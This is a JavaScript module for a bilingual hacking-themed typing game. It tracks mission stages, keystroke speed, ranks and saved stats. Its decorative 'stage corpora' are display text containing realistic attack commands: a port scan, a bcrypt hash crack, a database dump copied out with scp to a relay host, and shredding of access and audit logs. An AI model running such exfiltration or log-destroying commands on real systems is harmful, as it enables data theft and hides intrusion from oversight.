// Mission mode — pure logic (no DOM), framework-free, EN+JA.
// Sense of accomplishment formula: goal + progress + measurement + ending.

export const MISSIONS = [
  {
    id: "mainframe",
    keysPerStage: [70, 110, 90],
    en: {
      name: "BREACH THE MAINFRAME",
      brief: "Target: edge worker cluster prod-eu-1. Infiltrate before the trace completes.",
      target: "prod-eu-1",
    },
    ja: {
      name: "メインフレーム侵入",
      brief: "ターゲット: エッジワーカー群 prod-eu-1。トレースが完了する前に侵入せよ。",
      target: "prod-eu-1",
    },
  },
  {
    id: "weights",
    keysPerStage: [80, 120, 100],
    en: {
      name: "EXFIL THE MODEL WEIGHTS",
      brief: "Target: GPU cluster vault. 340TB of weights. In, out, no logs.",
      target: "vault-gpu-07",
    },
    ja: {
      name: "モデル重みの持ち出し",
      brief: "ターゲット: GPUクラスタ金庫。340TBの重み。入って、出る。ログは残すな。",
      target: "vault-gpu-07",
    },
  },
  {
    id: "satellite",
    keysPerStage: [90, 130, 110],
    en: {
      name: "HIJACK THE SATELLITE UPLINK",
      brief: "Target: LEO relay sat-77. One pass over the site. 28 minutes.",
      target: "sat-77",
    },
    ja: {
      name: "衛星アップリンク乗っ取り",
      brief: "ターゲット: LEO中継衛星 sat-77。上空通過は1回きり。残り28分。",
      target: "sat-77",
    },
  },
];

export const STAGE_IDS = ["scan", "crack", "exfil"];

// Stage-specific code: what streams while you progress each stage.
export const STAGE_CORPORA = {
  scan: `nmap -sS -p- 10.0.7.1 --min-rate 5000
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for prod-eu-1.internal (10.0.7.1)
Host is up (0.00031s latency).
PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  open     https
5432/tcp filtered postgresql
8080/tcp open     http-proxy
Service detection performed.`,
  crack: `hashcat -m 3200 -a 3 hash.txt --increment
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$)
Guess.Queue......: 4
Recovered........: 1/1 (100.00%) Digests
Speed.#1.........: 15.2 kH/s
Progress.........: 13188 (100.00%)
cGFzc3dvcmQxMjM6IGFjY2Vzc2dyYW50ZWQ=`,
  exfil: `pg_dump -Fc vault -f weights.dump
SELECT * FROM model_weights WHERE layer = 'all';
COPY (SELECT tensor FROM weights_340tb) TO STDOUT;
tar czf exfil.tar.gz weights.dump
scp exfil.tar.gz ghost@relay-9:~/
shred -uzn 3 access.log audit.jsonl
rm -rf ~/.bash_history
exit`,
};

export function stageCorpus(stageId, corpora = STAGE_CORPORA) {
  return corpora[stageId];
}

// Create fresh mission state.
export function createMission(missionId, corpora = STAGE_CORPORA) {
  const mission = MISSIONS.find((m) => m.id === missionId) || MISSIONS[0];
  return {
    missionId: mission.id,
    stageIndex: 0,
    keysThisStage: 0,
    startedAt: Date.now(),
    finishedAt: null,
    keystrokes: 0,
  };
}

export function totalKeys(missionId) {
  const mission = MISSIONS.find((m) => m.id === missionId) || MISSIONS[0];
  return mission.keysPerStage.reduce((a, b) => a + b, 0);
}

// Advance one keystroke. Returns { state, stageCleared, missionCleared }.
// A completed mission is terminal: repeated calls return the state unchanged.
export function advance(state, missionId, corpora) {
  if (state.finishedAt !== null) {
    return { state, stageCleared: false, missionCleared: false };
  }
  const mission = MISSIONS.find((m) => m.id === missionId) || MISSIONS[0];
  const next = { ...state, keysThisStage: state.keysThisStage + 1, keystrokes: state.keystrokes + 1 };
  const target = mission.keysPerStage[next.stageIndex];
  if (next.keysThisStage >= target) {
    if (next.stageIndex >= mission.keysPerStage.length - 1) {
      next.finishedAt = Date.now();
      return { state: next, stageCleared: true, missionCleared: true };
    }
    next.stageIndex = next.stageIndex + 1;
    next.keysThisStage = 0;
    return { state: next, stageCleared: true, missionCleared: false };
  }
  return { state: next, stageCleared: false, missionCleared: false };
}

export function stageProgress(state, missionId) {
  const mission = MISSIONS.find((m) => m.id === missionId) || MISSIONS[0];
  const target = mission.keysPerStage[state.stageIndex];
  return Math.min(1, state.keysThisStage / target);
}

export function missionProgress(state, missionId) {
  const mission = MISSIONS.find((m) => m.id === missionId) || MISSIONS[0];
  const done = mission.keysPerStage.slice(0, state.stageIndex).reduce((a, b) => a + b, 0) + state.keysThisStage;
  return Math.min(1, done / totalKeys(missionId));
}

export function elapsedSeconds(state) {
  const end = state.finishedAt ?? Date.now();
  return Math.max(0.001, (end - state.startedAt) / 1000);
}

export function keysPerSecond(state) {
  return state.keystrokes / elapsedSeconds(state);
}

// Rank thresholds in KPS (keys per second). S is genuinely hard.
export const RANK_THRESHOLDS = { S: 8, A: 5, B: 3 };

export function rank(kps) {
  if (kps >= RANK_THRESHOLDS.S) return "S";
  if (kps >= RANK_THRESHOLDS.A) return "A";
  if (kps >= RANK_THRESHOLDS.B) return "B";
  return "C";
}

// Titles by cumulative completed missions (localStorage count).
export const TITLES = {
  en: ["Script Kiddie", "Console Operator", "Ghost in the Wire", "Legend of the Net"],
  ja: ["スクリプトキディ", "コンソールオペレーター", "電脳の幽霊", "ネットの伝説"],
};

export const RANK_BLURBS = {
  en: {
    S: "inhuman speed. the machine fears you",
    A: "clean breach. ghost protocol",
    B: "solid work. trace barely missed you",
    C: "you're in... but the logs saw everything",
  },
  ja: {
    S: "人間業じゃない。マシンが震えている",
    A: "美しい侵入。ゴーストプロトコル",
    B: "悪くない。トレースにギリ間に合った",
    C: "入れた…が、ログには全部見られていた",
  },
};

export const UI_STRINGS = {
  en: {
    missionLabel: "MISSION",
    stageNames: { scan: "SCANNING PORTS", crack: "CRACKING AUTH", exfil: "EXFILTRATING" },
    completeTitle: "MISSION COMPLETE",
    completeSub: (m, r, kps, secs) => `${m} — RANK ${r} — ${kps.toFixed(1)} KPS — ${secs.toFixed(1)}s`,
    bestLabel: "PERSONAL BEST",
    streakLabel: (n) => `MISSIONS CLEARED: ${n}`,
    titleLabel: "RANKING",
    shareText: (m, r, kps) => `I breached ${m} at Rank ${r} (${kps.toFixed(1)} KPS) on Hacker Keys. Think you're faster?`,
    startHint: "press M to start the mission",
  },
  ja: {
    missionLabel: "ミッション",
    stageNames: { scan: "ポートスキャン中", crack: "認証クラック中", exfil: "データ持ち出し中" },
    completeTitle: "ミッション完了",
    completeSub: (m, r, kps, secs) => `${m} — ランク${r} — ${kps.toFixed(1)} KPS — ${secs.toFixed(1)}秒`,
    bestLabel: "自己ベスト",
    streakLabel: (n) => `達成ミッション数: ${n}`,
    titleLabel: "称号",
    shareText: (m, r, kps) => `Hacker Keysで「${m}」をランク${r}（${kps.toFixed(1)} KPS）で突破した。お前もできるか？`,
    startHint: "Mキーでミッション開始",
  },
};

export function titleFor(clearedCount, lang = "en") {
  const titles = TITLES[lang] || TITLES.en;
  if (clearedCount >= 20) return titles[3];
  if (clearedCount >= 10) return titles[2];
  if (clearedCount >= 3) return titles[1];
  return titles[0];
}

// localStorage persistence (best per mission, total cleared).
const LS_KEY = "hacker-keys:v1";

export function loadStats(storage) {
  try {
    const raw = storage.getItem(LS_KEY);
    if (!raw) return { best: {}, cleared: 0 };
    const parsed = JSON.parse(raw);
    if (typeof parsed !== "object" || parsed === null) return { best: {}, cleared: 0 };
    const best = typeof parsed.best === "object" && parsed.best !== null ? parsed.best : {};
    const cleared = typeof parsed.cleared === "number" && parsed.cleared >= 0 ? Math.floor(parsed.cleared) : 0;
    return { best, cleared };
  } catch {
    return { best: {}, cleared: 0 };
  }
}

export function saveClear(storage, missionId, kps, cleared) {
  const stats = loadStats(storage);
  const prev = stats.best[missionId];
  const next = {
    best: { ...stats.best, [missionId]: typeof prev === "number" ? Math.max(prev, kps) : kps },
    cleared: stats.cleared + 1,
  };
  try {
    storage.setItem(LS_KEY, JSON.stringify(next));
  } catch {
    // storage unavailable — progress not saved, but the run still counts in-session
  }
  return next;
}
